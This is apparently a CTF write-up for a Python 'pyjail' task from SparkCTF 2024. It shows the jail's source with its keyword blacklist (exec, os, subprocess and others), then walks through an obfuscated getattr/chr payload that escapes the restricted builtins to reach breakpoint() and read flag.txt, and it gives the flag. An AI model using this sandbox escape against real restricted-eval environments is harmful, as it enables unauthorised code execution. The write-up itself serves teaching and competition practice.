## Pyhell-Task-SparkCTF-2024
This repo will cover the writeup for the pyjail task hosted at SparkCTF 2024
# Description
This task focused on breaking a Python environment that restricts the built-in functions accessible to the user and employs a blacklist to prohibit specific keywords and characters, which could otherwise be exploited to circumvent these limitations.

#### Files: jail.py
```python
import re
import builtins
import sys

def safe_eval(user_input):
    safe_builtins = {
        "__builtins__": {name: getattr(builtins, name) for name in ['print', 'int', 'float', '__import__', 'getattr', 'chr']}
    }

    try:
        exec(user_input, safe_builtins, {})
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

def jail():
    ascii_art = """
                                                                                                        _..._                                  
                                .---..---.                                                           .-'_..._''.                    .---..---. 
   .              __.....__     |   ||   |          .--.   _..._                                   .' .'      '.\\     __.....__     |   ||   | 
 .'|          .-''         '.   |   ||   |          |__| .'     '.                                / .'            .-''         '.   |   ||   | 
<  |         /     .-''"'-.  `. |   ||   |          .--..   .-.   .                              . '             /     .-''"'-.  `. |   ||   | 
 | |        /     /________\\   \\|   ||   |          |  ||  '   '  |              __              | |            /     /________\\   \\|   ||   | 
 | | .'''-. |                  ||   ||   |          |  ||  |   |  |           .:--.'.            | |            |                  ||   ||   | 
 | |/.'''. \\\\    .-------------'|   ||   |          |  ||  |   |  |          / |   \\ |           . '            \\\\    .-------------'|   ||   | 
 |  /    | | \\    '-.____...---.|   ||   |          |  ||  |   |  |          `" __ | |            \\ '.          .\\    '-.____...---.|   ||   | 
 | |     | |  `.             .' |   ||   |          |__||  |   |  |           .'.''| |             '. `._____.-'/ `.             .' |   ||   | 
 | |     | |    `''-...... -'   '---''---'              |  |   |  |          / /   | |_              `-.______ /    `''-...... -'   '---''---' 
 | '.    | '.                                           |  |   |  |          \\ \\._,\\ '/                       `                                
 '---'   '---'                                          '--'   '--'           `--'  `"                                                         
!! Even Michael Scofield can not escape this .
    """
    print(ascii_art)

    max_input_length = 553

    while True:
        user_input = input(">>> ")

        if len(user_input) > max_input_length:
            print("Bro chill !!! That's kinda long")
            continue

        blacklist = ['exec', 'eval', 'os', 'sys', 'subprocess', 'file', 'open', 'register', 'setattr', 'input', 'mro', 'globals', 'class', 'getitem', 'breakpoint', '_', '.','[',']']

        for block in blacklist:
            if block in user_input:
                print(f"No no {block} is not allowed in here")
                break
        else:
            safe_eval(user_input)

if __name__ == "__main__":
    jail()
```
### Payload-example :
 ```python
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
```

Since we have a custom builtins that restrices us from doing pretty much anything, the idea is mainly to find a payload that can access the original builtins. This payload navigates Python's internal structures to reference the original __builtins__ module not the restricted version provided in the script.
But first we need to find replacements for `_ [ ] .` and other words like `class register builtins breakpoint`.
The main key is to exploit the custom builtins set in our `safe_eval` function. Pretty much `print int float` are kinda usless in our case ( maybe print is useful to test ). We can notice that we have the `getattr` function which if you google it you can already find that it can replaces `.` to accessing attributes.
Another thing in our custom builtins we notice the `chr` function which we can use to replace the `_` by just using `chr(95)`, so now 2 of our major problems are done. 
We will conduct another search to find alternatives for replacing the use of `[]` in Python and one of the main things we will find is the use of getitem method.
We are almost done we found a way to replace the main restrictions  `_ [ ] .`. Now we just need to find a way to bypass the restrictions set for the words in the blacklist which pretty easy we need just to concatenate them using `+` for example we change `class` to `'cl'+'ass'`. That's it now we how to bypass everything all we need to do is construct our new payload ( just don't tilt while constructing it ) 
Our payload should transform from: 
 ```python
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
```
to: 
 ```python
getattr(getattr(getattr(getattr(getattr(getattr(getattr((), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'subcl'+'asses' + chr(95) + chr(95))(getattr(getattr((), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95))), chr(95) + chr(95) + 'get'+'item' + chr(95) + chr(95))(0), 'regi'+'ster'), chr(95) + chr(95) + 'buil'+'tins' + chr(95) + chr(95)), chr(95) + chr(95) + 'get'+'item' + chr(95) + chr(95))('break'+'point')()
```
After using the breakpoint() function and starting the debugger we can just open our flag 
![Alt text](/flag.png)

 ```python
print(__import__('builtins').open('flag.txt', 'r').read())                                                                                                                                                                            
```
We need to import the builtins once again since open is not defined ( sorry not sorry) 
and there we go we have our flag : `SparkCTF{PYJ41L_15_N0_FUN}`.
